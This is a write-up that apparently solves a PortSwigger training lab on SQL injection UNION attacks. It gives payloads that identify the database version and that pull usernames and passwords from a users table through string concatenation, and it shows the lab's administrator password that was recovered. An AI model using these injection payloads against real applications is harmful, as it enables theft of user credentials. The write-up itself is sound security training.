## Lab Description: SQL injection UNION attack, retrieving multiple values in a single column

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/e3d04311-d166-4ed9-b258-1b33f773fd03)

Solution:

First find the database which is used

I want to extract both usernames and passwords, while only having a single string column. For this, I can concatenate multiple values into single fields. The syntax depends on the database engine, so find out which database is used to drive the page.

` +Union+select+null,version()+from+users+-- `

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/91638dd5-c634-4ae3-b8b3-5a90ce0a1827)

### Extracting Username and Password
I know that users contain username and password.As I have just a single string column, I can either issue two queries and manually combine the data or concatenate these values into a single string to be able to extract them in one go.

` +union+select+null,username+||+'~~'+||password+from+users+-- `

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/370a7811-ace4-495e-a70a-987b7f871e89)

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/1eea050f-4b2d-4ffd-bd6b-42fc940e7783)

` administrator~~r7yy2wjuwby38u4rk3je `

![Screenshot 2024-01-28 101850](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/92892d6a-87f5-47e8-b1db-3f125e858b59)

![Screenshot 2024-01-28 101907](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/c6426aea-03de-40d6-a0b8-fe050737bf8b)

